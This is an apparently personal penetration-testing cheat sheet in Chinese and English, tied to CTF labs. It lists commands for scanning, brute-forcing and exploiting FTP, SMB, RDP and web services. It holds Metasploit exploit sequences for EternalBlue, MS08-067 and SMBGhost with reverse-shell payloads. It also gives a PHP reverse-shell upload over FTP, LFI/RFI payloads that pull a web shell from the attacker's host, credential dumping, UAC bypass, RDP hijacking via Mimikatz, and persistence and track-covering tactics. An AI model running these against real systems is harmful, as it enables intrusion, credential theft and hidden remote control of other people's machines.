# step 1 : 掃描網路
	 --> 測試我們找到的每個主機的網路 (Traceroute)
		=> TCP  : sudo traceroute -T 192.168.4.5
		=> UDP  : sudo traceroute -U 192.168.4.5
		=> ICMP : sudo traceroute -I 192.168.4.5
	 --> 1.1 確定網路範圍
	 	=> ip addr show
	 --> 1.2 偵察 ( discover live hosts)
	 	=> nmap -sn 192.168.4.0/24
	 --> 1.3 連接埠掃描 (scan for open ports)
	 	=> nmap -p 1-65535 192.168.4.5
	 --> 1.4 漏洞評估(Nessus) 
	 --> 1.5 分析與規劃 (識別潛在的攻擊媒介)
	 --> 1.6 開發 (利用已識別的漏洞來獲得未經授權的存取、升級權限或收集敏感資料)
	 --> 1.7 後利用 (保持持久性)
	 --> 1.8 報告 (提供的詳細報告中記錄所有發現的漏洞、被利用的系統和建議的修復策略)
	 --> 1.9 清理 (對目標網路所做的任何修改均已恢復，以使網路保持原始狀態)
# step2 : 攻擊 Linux 機器
	 --> 2.1 掃描 TCP 端口
	 	=> 掃描最常見的端口 : nmap 
	 	=>  65535 : nmap
	 	=> UDP : 
	 --> 2.2 找到其運行的服務
	 	=> 目標是找到允許我們無需身份驗證即可連接到電腦或將文件發送到電腦或 Web 伺服器的服務
	 	=> 穩定的、高度特權的 shell。root 訪問
	 	=> want 將檔案傳輸到機器 => 從機器下載檔案 => 轉向其他網路
	 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
	 	=> Juice Information
	 		--> Linux 核心版本
	 		--> 正在運行的服務的版本
	 		--> 有時我們可以遠端檢測用戶
	 	=> SSH Service
	 		--> port : 
	 		--> 如果您找到有效用戶，請嘗試暴力破解 ssh
	 	=> FTP Service
	 		--> 舊的 FTP 可以作為遠端系統的入口點 
	 		--> 允許匿名用戶
	 		--> 取得一些檔案或更好地將檔案傳送到伺服器
	 		--> 注意隱藏資料夾以及資料夾的名稱和路徑
	 	=> Samba Service (SMB)
	 		--> 大量的 CVE，而且大多數時候配置很差
	 	=> Web Servers
	 		--> 伺服器 : https://hacking-webservers.popdocs.net/
	 		--> 應用程式 : https://hacking-web-applications.popdocs.net/
# Service 
## SSH Service
	  => password 
	  	=> ssh user@remote -p port 
	  	=> e.g ssh tom@172.21.70.110 -p 22
	  => 私鑰 
	  	=> ssh-keygen -t rsa   #-t表示类型选项，这里采用rsa加密算法
	  		--> 私鑰: (/root/.ssh/id_rsa.) 
	  		--> 公鑰: (/root/.ssh/id_rsa.pub)
	  		--> ~/.ssh/authorized_key
	  
		  => 投遞公鑰到服務端
		  	=> cd /home/tom/.ssh
		  	=> 上傳 : ssh-copy-id user@remote -p port
	  
	  	  => Windows
	  	  	=> ssh user@remote -p port 'mkdir -p .ssh && cat >> .ssh/authorized_keys' < ~/.ssh/id_rsa.pub
	  => 別名配置
	  	=> ~/.ssh/config
		  	Host host1
			    HostName 172.21.70.110
			    User tom
			    Port 22
			    
		=> ssh host1 (login)
			
## FTP Service
   	=> 使用 FTP 
   		=> ftp <target-ip> <target-port>
   	=> 使用lftp
   		=> lftp X.X.X.X
   	=> 使用網頁
   		=> URL : ftp://username:password@X.X.X.X
   		
  	=> 檢查目標主機上是否有 FTP 伺服器
  		=> nmap -p 21 X.X.X.X
   	=> 了解正在執行的服務及其版本
   		=> nc -nv X.X.X.X 21
   		
   	=> 列舉FTP伺服器支援的功能
   		=> nmap -p 21 --script ftp-features <target-ip>
   	=> 枚舉預設和通用
   		=> gobuster dir -u ftp://<target-ip> -w <wordlist-path>
   		
   	=> 匿名	(anonymous)
	=> 通用  (admin、administrator、root、 ftpuser,test)
   		
   	=> 暴力破解
		=> hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] ftp://X.X.X.X
		=> nmap -p 21 --script ftp-brute X.X.X.X
		
	=> FTP Bounce  反彈 -- 掩蓋攻擊來源。
		1. 連接到 FTP 伺服器 : ftp X.X.X.X
		2. 將資料重定向到目標 : quote PORT target_IP,port
		3. 傳送到目標的檔案傳輸 :get filename
	
	=> Nmap
		=> 掃描目標網絡，使掃描看起來好像來自指定的 FTP 伺服器
		=> nmap -b <FTP_server>:<port> <target_network>
		
	=> Metasploit:
		=> 掃描易受攻擊的 FTP 伺服器以查找其他系統上的開放連接埠
		use auxiliary/scanner/ftp/ftp_bounce
		set RHOSTS <FTP_server>
		set RPORT <FTP_port>
		run
		
	=> 常用 
		> lcd 更改本地目錄 // cd 更改伺服器目錄 // ls // get filename.txt// mget *.txt 
		> put filename.txt //mput *.txt // bin //ascil //quit
		
	=> 下載所有
		> wget -m ftp://anonymous:anonymous@X.X.X.X
	=> 反向 shell
		> wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
		> $ip = '<your-local-ip>';$port = 1234;
		> nc -lvnp 1234
		> ftp <target-ip>
		> ftp> put shell.php
		> URL : http://target.com/path/to/ftp/shell.php
 ##  Samba Service (SMB)
  	=> 列出目標伺服器上的所有可用共用
  		=> smbclient -L //target-ip
  	=> 識別目標網路內執行 SMB 服務的裝置
  		=> nmap -p 445 --open -sV <target-ip>
  	=> SMB 版本
  		=> nmap --script smb-protocols -p 445 <target-ip>
  		
  	=> 進一步列舉
  		=> 列出共享 : smbclient -L //192.168.1.100 -U anonymous
  		=> 枚舉 : enum4linux -a target-ip
  			=> smbmap -H target-ip
  			=> nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse target-ip
  			
  	=> 空會話
  		=> rpcclient -U "" <target-ip>
  	=> 檢查 SMB 簽章狀態
  		=> nmap --script smb-security-mode.nse -p445 <target-ip>
  	
  	=> MS08-067 
  		=> 允許遠端攻擊者透過精心設計的 RPC 請求執行任意程式碼
	  	use exploit/windows/smb/ms08_067_netapi
		set RHOSTS <TARGET-IP>
		set PAYLOAD windows/x64/meterpreter/reverse_tcp
		set LHOST <YOUR_IP>
		exploit
		
	=> MS17-010
		=> 使遠端攻擊者能夠透過精心設計的 SMBv1 請求執行任意程式碼
		use exploit/windows/smb/ms17_010_eternalblue
		set RHOSTS <TARGET-IP>
		set PAYLOAD windows/x64/meterpreter/reverse_tcp
		set LHOST <YOUR_IP>
		exploit
		
	=> SMBGhost (CVE-2020-0796 )
		=> 針對SMBv3中的SMBGhost漏洞
		use exploit/windows/smb/cve_2020_0796_smbghost
		set RHOSTS <TARGET-IP>
		set PAYLOAD windows/x64/meterpreter/reverse_tcp
		set LHOST <YOUR_IP>
		exploit	
		
	=> 利用 Meterpreter shell 可以協助取得系統存取權限
		=> getsystem
		
	=> 轉儲雜湊值
		use post/windows/gather/smart_hashdump
		exploit
		
	常見 : 
		> 連接到 SMB/CIFS 伺服器	smbclient //server/share
		> 從 SMB/CIFS 伺服器下載文件 smbget smb://server/share/file
		> 更改使用者的 SMB 密碼 smbpasswd -r server -U username
		> 顯示有​​關 SMB 連線的信息	smbstatus
		> 列出網路上的 SMB/CIFS 共享	smbtree
		> 掛載 SMB/CIFS 共享 mount -t cifs //server/share /mnt/point
		> 卸載 SMB/CIFS 共享 umount /mnt/point
 ## Web Servers
  	=> Apache Vulnerabilities
  	=> Find Folders & Files
  	=> Fing login pages
  	=> Find Folders & Files
  	=> gobudter
 
# step3 : 攻擊 Windows 機器
	  --> 2.1 辨識即時主機 
	  	=> 識別活動主機及其開放連接埠
	  	=> nmap -sT -p- 192.168.1.0/24
	  --> 2.2 收集系統資訊 (WinRM//SMB)
	  	=> 收集作業系統版本、修補程式和服務等系統詳細資訊
	  	=> smbclient -L \\\\TARGET_IP_ADDRESS
	  --> 2.3 檢查漏洞
	  	=> Nessus使用或等軟體執行漏洞掃描
	  	=> OpenVAS以偵測 Windows 電腦上的潛在安全風險。
	  --> 2.4 文件調查結果
	  	=> 表格 : IP位址 -- 作業系統版本 -- 開放埠 -- 漏洞
  
 ## NetBIOS Attacks
 	=> https://netbios-penetration-testing.popdocs.net/
 	=> 入侵139端口
 	=> https://rdp-penetration-testing.popdocs.net/?_gl=1*1rag2pe*_ga*MTkxNzM3ODAzMi4xNzM2NTAyOTIw*_ga_WB8YYH3WJK*MTczNjUwMjkyMC4xLjEuMTczNjUwMzMwNi42MC4wLjA.
 	~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	Nbstat
	 ~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	NmbLookup 
		=> nmblookup -A 10.0.0.3
	 ~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	 Nmap and NetBIOS
	 	=> nmap -sV 10.41.10.1 --script nbstat.nse -V
	 ~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	 Microsoft Tools
		=> Dsget
		=> PsList
		=> psloggedon
		=> PsLogList
		=> PsPasswd
		=> PsShutdown
		=> NetBIOS Enumerator
		=> Enumerating SIDs
		=> Enumerating User Accounts
		=> Administrator ID
		=> NetBIOS Name Service Spoofer
 	msf > use auxiliary/spoof/nbns/nbns_responsemsf auxiliary(nbns_response) > show actions...actions...msf auxiliary(nbns_response) > set ACTION < action-name >msf auxiliary(nbns_response) > show options...show and set options...msf auxiliary(nbns_response) > run
  
  		=> smb_ms17_010
  		=> ms17_010_eternalblue
  
 # step 4 : 旋轉方法論 Pivoting Methodology
	4.1 旋轉方法論
		=> 1. Initial Compromise 初步妥協 -- 目標網路內初始系統的存取權
		=> 2. Internal Reconnaissance 內部偵察 -- 了解網路拓撲、識別潛在目標並收集有關安全措施的資訊
		=> 3. Privilege Escalation 權限升級
		=> 4. Pivoting 旋轉 -- 網路橫向移動的墊腳石
		=> 5. Maintaining Access 維持訪問 -- 是透過部署後門 -- 持久訪問
		=> 6. Data Exfiltration 資料外洩 -- 可能出於惡意目的從受感染的系統中洩漏敏感資料
		
	4.2 旋轉 Linux 工具
		=> Proxychains : 
			=> tool -- 強制任何給定應用程式建立的任何 TCP 連線遵循使用者定義的代理伺服器鏈
		=> SSHuttle : 
			=> 透明的 VPN -- 透過 SSH 隧道轉送所有 TCP 流量 
		=> Chisel
			=> 快速 TCP 隧道
			=> 與其他滲透測試工具結合使用，並允許在受損系統中進行旋轉(Pivoting)
		=> Iodine
			=> DNS 伺服器傳輸 IPv4 資料的工具 
			=> 繞過防火牆和存取內部資源
		=> socat
			=> 多功能中繼工具
			=> 用於在兩個獨立資料通道之間建立雙向資料傳輸
		=> PowerCat
			=> PowerShell 的 netcat 替代品
			=> 支援加密通信，可用於 Windows 環境中的旋轉(Pivoting)
		=> Htunnel
			=> 能夠透過 HTTP(S) 流量進行旋轉的工具
			=> 允許隱密的資料外洩以及命令和控制
		=> Dnscat2
			=> 透過 DNS 協定建立加密命令和控制 (C2) 通道的工具
		=> Proxytunnel
			=> 過業界標準 HTTPS 代理將 stdin 和 stdout 連接到 Internet 中某處的來源伺服器的程式
		=> ProxyJump (SSH ProxyJump) 
			=> 它是 OpenSSH 用戶端中的一個設定選項，可以簡化建立多跳 SSH 連線的過程
		
		
	4.3 Windows Linux 工具
		=> PowerShell Empire
			=> 利用 PowerShell 控制系統、提升權限和執行橫向移動的後利用框架
		=> Mimikatz
			=> 後期利用，從記憶體中提取明文密碼、雜湊值和其他憑證
		=> PsExec
			=> Sysinternals Suite 的一部分，允許在遠端系統上執行進程
		=> PowerSploit
			=> Microsoft PowerShell 模組的集合，可協助進行滲透測試和後利用活動
		=> Covenant
			=> 一種 .NET 指令和控制框架，讓攻擊者在受感染的 Windows 系統上執行指令
		=> Empire
			=> 專為 Windows 環境設計的後開發框架。
		=> BloodHound
			=> 分析 Active Directory 安全性的工具，通常用於發現和利用權限升級路徑
		=> CrackMapExec (CME)
			=> 後利用工具，可自動評估大型 Active Directory 網路
		=> WMIExec
			=> Windows Management Instrumentation (WMI) 在遠端系統上執行指令的工具
		=> RDPWrap
			=> 允許 Windows 系統上的多個 RDP（遠端桌面協定）會話，方便遠端存取
		=> Veil Framework
	  		=> 用於產生和交付 Metasploit 有效負載的工具集合，包括適用於 Windows 環境的工具
# step5 : Linux 後使用 (POST)
	=> Information Gathering
		=> System Identification 系統識別：識別 Linux 發行版、核心版本和其他系統詳細資訊。
		=> User Enumeration 使用者枚舉：列舉受感染系統上的使用者及其權限。
	=> Privilege Escalation
		=> Exploiting Vulnerabilities 利用漏洞：辨識並利用漏洞來提升權限。
		=> Abusing Sudo Permissions 濫用 sudo 權限：利用 sudo 權限中的錯誤配置來取得更高的權限。
		=> Kernel Exploits 核心漏洞：尋找可用於提權的核心漏洞。
	=> Maintaining Persistence
		=> Backdoors 後門：安裝後門以實現持久存取。
		=> Cron Jobs (Cron 作業)：建立連續存取的排程任務。
		=> SSH Keys (SSH 金鑰)：新增 SSH 金鑰以進行持久遠端存取。
	=> Lateral Movement
		=> SSH Keys (SSH 隧道)：建立 SSH 隧道以存取網路中的其他系統。
		=> Pass-the-Hash (PtH) 哈希傳遞：使用受損的憑證在網路內橫向移動。
		=> Exploiting Trust Relationships (利用信任關係)：利用系統之間的信任關係在網路上移動。
	=> Data Exfiltration
		=> 壓縮和加密：在洩漏之前壓縮和加密敏感資料。
		=> 隱蔽通道：使用隱蔽通道進行隱密的資料傳輸
	=> Covering Tracks
		=> Log 日誌篡改：修改或刪除日誌以消除洩漏痕跡。
		=> 清除 Shell 歷史記錄：清除命令歷史記錄以隱藏已執行的命令。
		=> Rootkit 安裝：安裝 Rootkit 來隱藏惡意活動。
	=> Exploiting Services
		=> 資料庫利用：利用資料庫進行資料檢索和操作。
		=> Web 應用程式攻擊：識別並利用伺服器上託管的 Web 應用程式中的漏洞。
	=> Resource Abuse
		=> CPU 與記憶體使用：利用資源進行加密貨幣挖礦或拒絕服務攻擊。
		=> 網路掃描：掃描內部網路以尋找潛在目標。
# step6 : Windows 後利用
	=> Information Gathering (System Identification / User Enumeration)
  	=> Privilege Escalation
		=> Token Manipulation: Manipulate access tokens to escalate privileges.
	=> Maintaining Persistence
		=> Registry Modifications: 進行註冊表更改以確保重新啟動後的持久性。
		=> Scheduled Tasks: 建立計劃任務以連續存取。
		=> Service Installation:安裝惡意服務以確保持久性	
	=> Lateral Movement
		=> Pass-the-Ticket (PtT): 使用 Kerberos 票證進行橫向移動
		=> Pass-the-Hash (PtH): 使用受損的憑證在網路內橫向移動
		=> Exploiting Trust Relationships: ：利用系統之間的信任關係在網路上移動
	=> Exploiting Services
		=> 資料庫利用：利用資料庫進行資料檢索和操作。
		=> Web 應用程式攻擊：識別並利用伺服器上託管的 Web 應用程式中的漏洞。
		=> MS Office 巨集利用：利用 Microsoft Office 文件中的巨集來執行程式碼
# Networking
	OSI層 : 
		=> 物理層 => 資料鏈結層 => 網路層 => 傳輸層 => 會話層 => 表示層 => 應用層 =
		=> Physical Layer =>Data Link=> Network=>Transport=>Session=>Presentation => Application 
	協定
		 => FTP -- 測試檔案傳輸協定是否存在弱憑證、匿名存取和命令注入等漏洞
		 => RDP -- 專注於遠端桌面協議，並尋找利用弱身份驗證、未打補丁的系統和其他安全漏洞的方法
		 => SMB -- 檢查伺服器訊息區塊協定是否存在配置錯誤、易受攻擊的版本和缺少 SMB 簽章等問題
		 => PostgreSQL -- 透過注入攻擊、預設憑證和錯誤配置來評估 PostgreSQL 資料庫的安全性
		 => SSH -- Secure Shell 協定測試包括檢查弱密鑰、SSH 版本以及是否遭受中間人攻擊
		 => NetBios -- 分析 NetBIOS 的資訊外洩、會話劫持以及利用 NetBIOS 名稱服務的可能性
		 => SMTP -- 簡單郵件傳輸協定測試旨在發現開放中繼、欺騙和命令注入漏洞
		 => SNMP -- 滲透測試人員探測簡單網路管理協定是否有薄弱的社區字串和資訊洩漏
		 => Kerberos -- 重點關注身份驗證協議的弱點，例如票證攻擊、暴力破解和利用錯誤配置
		 => Active Directory -- 測試 Active Directory 設定的安全性，檢查權限升級、密碼原則和 Kerberos 攻擊等問題
	 
	 子網路劃分
	 	=> IP 位址 ，192.168.1.0 
	 	=> 子網路遮罩 255.255.255.0
	 	=> 範圍從 192.168.1.0到192.168.1.255
	 
	 路由
	 	=> 新增靜態路由，請使用ip route add命令 (網路範圍、網關位址和裝置名稱)
	 	=> ip route add 10.10.10.0/24 via 10.10.10.1 dev tun0
	 	=> 告訴作業系統將所有發送到網路的流量透過網路10.10.10.0/24介面傳送到下一跳網關。10.10.10.1 tun0	
 	
## Network Protocols
	 => FTP 21
	 	 => 預設憑證
	 	 	> guest:guest
			> anonymous:anonymous
		=> 版本檢測
			> use exploit/unix/ftp/tftp-enum.nse
			> set RHOSTS 
			> set RPORT 21	
		
		=> 暴力破解 FTP 服務
			> hydra -l admin -P Top_100_Passwords.txt ftp://localhost/	
			> nmap --script ftp-brute -p 21 --script-args 
				userdb=/root/Top_10_UserAdmins.txt,passdb=root/Top_100_Passwords.txt <IP>
			> msf6 > use auxiliary/scanner/ftp/anonymous
			> set RHOSTS nerdherd.thm
			> set RPORT 21
			> run	
		
		=> 利用vsftpd 2.3.4後門
			> use exploit/unix/ftp/vsftpd_234_backdoor
			
		=> 用於 FTP 的 Nmap NSE 腳本	
			> ls -la /usr/share/nmap/scripts | grep -e "ftp"
			
		=> 搭建FTP伺服器環境來測試漏洞，可以使用Docker或手動建立環境
			> docker run -d -p 21:21 -p 20:20 -p 21000-21010:21000-21010 --name ftp_server fauria/vsftpd
	 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 			
	 => SSH 22
		=> SSH 滲透測試的目標
			識別弱身份驗證：檢查是否有容易被猜測或暴力破解的弱密碼和金鑰。
			檢查 SSH 配置：分析 SSH 伺服器配置是否有任何錯誤配置或過時的協定。
			評估加密強度：檢查所使用的加密演算法和密碼，以確保它們強大且安全。
			測試存取控制：驗證存取控制是否正確執行誰可以登入以及他們可以在伺服器上執行哪些操作。

		=> 滲透測試方法
			偵察：收集有關目標 SSH 伺服器的資訊。
			掃描：使用 Nmap 等工具來識別開放的 SSH 連接埠和服務。
			漏洞評估：應用漏洞掃描器（例如 Nessus 或 OpenVAS）來尋找已知漏洞。
			利用：嘗試利用已識別的漏洞來獲得未經授權的存取。
			後利用：評估成功違規的影響以及哪些數據或控制可能受到損害。
			報告：記錄改進安全性的調查結果、證據和建議。
	 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	 => HTTP 80
	  	 => 列舉資料夾
	  	 	=> gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -o gobuster-root -t 50
	  	 => 列舉文件
	  	 	=> gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php
	  	 => 多個單字清單枚舉資料夾
	  		 => for file in $(ls /usr/share/seclists/Discovery/Web-Content); do gobuster -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/$file -e -k -l -s "200,204,301,302,307" -t 20 ; done
	 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	 => NetBISO 139
	  	 => sudo nmap -sT -sU -sV -p135,137,138,139,445 --open <IP>
	  	 
	  	 => 列舉股份
	  	 	> nmap --script smb-enum-shares -p 445
	  	 => 作業系統發現
	  	 	> nmap --script smb-os-discovery -p 445
	  	 => 列舉用戶
	  	 	> nmap --script=smb-enum-users -p 445
	  	 => 全部
	  	 	> nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -p 139,445
	  	 	
	  	 => NULL 
		  	 # On some configuration omitting '-N' will grant access.
			smbclient -U '' -L \\\\<IP> 
			
			smbclient -U '' -N -L \\\\<IP> 
			smbclient -U '%' -N -L \\\\<IP>
			smbclient -U '%' -N \\\\<IP>\\<Folder>
		=> 匿名登入
			# Enter a random username with no password and try for anonymous login.
			crackmapexec smb <IP> -u 'anonymous' -p ''

			crackmapexec smb <IP> -u '' -p ''
			crackmapexec smb <IP> -u '' -p '' --shares
			
		=> e.g 破解圖執行程式
			crackmapexec smb <IP> -u <User> -p <Password> --rid-brute
			crackmapexec smb <IP> -u <User> -p <Password> --lsa
			crackmapexec smb <IP> -u <User> -p <Password> --sam
			crackmapexec smb <IP> -u <User> -p <Password> --pass-pol
			crackmapexec smb <IP> -u <User> -p <Password> --local-groups
			crackmapexec smb <IP> -u <User> -p <Password> --groups
			crackmapexec smb <IP> -u <User> -p <Password> --users
			crackmapexec smb <IP> -u <User> -p <Password> --sessions
			crackmapexec smb <IP> -u <User> -p <Password> --disks
			crackmapexec smb <IP> -u <User> -p <Password> --loggedon-users
			crackmapexec smb <IP> -u <User> -p <Password> --loggedon-users --sessions --users --groups --local-groups --pass-pol --sam --rid-brute 2000
	 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	 => SMB 445
	  	 => https://smb-penetration-testing.popdocs.net/
	  	 
	  	 => Nmap NSE 腳本 :  
	  	 	> ls -la /usr/share/nmap/scripts | grep -e "smb"
	  	 => Metasploit SMB 枚舉腳本
	  	 
	  	 => 1. 列舉 SMB 版本
	  	 	> nmap -p 445 --script smb-protocols nerdherd.thm
	  	 => 2. 枚舉 SMB 共享
	  	 	> nmap -p 445 --script smb-enum-shares nerdherd.thm
	  	 => 3. 列舉 SMB 用戶
	  	 	> nmap -p 445 --script smb-enum-users nerdherd.thm
	  	 	>  smbclient -L //nerdherd.thm/ -U anonymous 
	  	 	
	  		msf6> use auxiliary/scanner/smb/smb_enumshares
			msf6 > set SpiderShares true
			SpiderShares => true
			msf6 auxiliary(scanner/smb/smb_enumshares) > run
	 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	 => MySQL 3306
	 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	 => RDP 3389
	  	 => 列舉 RDP
	  	 	> nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 <IP>
	  	 => 暴力破解
	  	 	> hydra -L <User/s.txt> -P <Password/s.txt> rdp://<IP>
	  	 => 連接到 Windows RDP
	  	 	> xfreerdp /v:'<IP>' /u:'<User>' /p:'<Password>' +clipboard
	  	 => 劫持 RDP
	  	 	> Mimikatz
	  	 		> Invoke-Mimikatz -Command '"ts::sessions"'
	  	 		> Invoke-Mimikatz -Command '"token::elevate" "ts::remote /id:4"'
# Web Attacks
	=> XSS 
		=> 將惡意腳本注入其他使用者看到並與之互動的內容中
		=> 竊取受害者的會話 cookie 或其他敏感資訊、冒充使用者	
	=> SQLi
	=> Path Traversal (../)
		=> ../../etc/passwd
	=> Command injection
	=> LFI - local File inclusion
		=>  /index.php?language=/etc/passwd
		
		> 繞過基本路徑遍歷過濾器
			=> /index.php?language=....//....//....//....//etc/passwd
		> 使用 URL 編碼繞過過濾器
			=>  /index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
		> 空字節
			=> /index.php?language=../../../../etc/passwd%00
		> base64過濾器讀取PHP
			=> /index.php?language=php://filter/read=convert.base64-encode/resource=config
			
	=> RDP
		=> echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>
		=> /index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

	=> GIF
		=> echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
		=> /index.php?language=./profile_images/shell.gif&cmd=id
	=> zip
		=>  echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
		=> /index.php?language=zip://shell.zip%23shell.php&cmd=id
		
	=> jpg
		=> php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
		=> /index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
## Web CMS Attacks
	=> Wordpress
	=> Joomla
	=> TomCat
## Exploits
	=> Search Exploits
	=> Windows
		ps
		getuid
		getpid
		getsystem
		ps -U SYSTEM

		CHECK UAC/Privileges
		run post/windows/gather/win_privs

		BYPASS UAC
		Background the session first
		exploit/windows/local/bypassuac
		set session

		After PrivEsc
		migrate <pid>
		hashdump
## Tools
	=> dirb 
		=> dirb http://10.10.10.10/dir -u admin:admin
	=> Gobuster
	=> Nmap
		=> nmap -sn 10.10.10.0/24
		=> nmap -sV -p- -iL targets -oN nmap.initial -v
		=> nmap -A -p- -iL targets -oN nmap.aggressive -v
		=> nmap -p --script=vuln -v
	=> Netcat
		=> Listening for reverse shell : nc -nvlp 1234
		=> Banner Grabbing : nc -nv 10.10.10.10 <port>
	=> Burpsuite
	=> SQL Map
	=> Metasploit
	=> Hydra
		=> Form : hydra http://10.10.10.10/ http-post-form 
		"/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V

		=> hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh
		=> hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh
		
	
	=> John the Ripper
		=> Crack Linux Password from /etc/shadow
			=> john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
			=> unshadow passwd shadow > unshadowed.txt
			=> john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

	=> Hashcat
		=> hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...
	
	
	=> RevShell
	=> MD5 Crack
	=> CyverChef
	=> SecLists
 
 ## Other platform 
	thm 
 		=> DogCat // Archangel // OWASP Juice Shop
	
	SMB Penetration Testing
		=> port 445
		=> https://smb-penetration-testing.popdocs.net/smb-attacks/exploits/windows
	
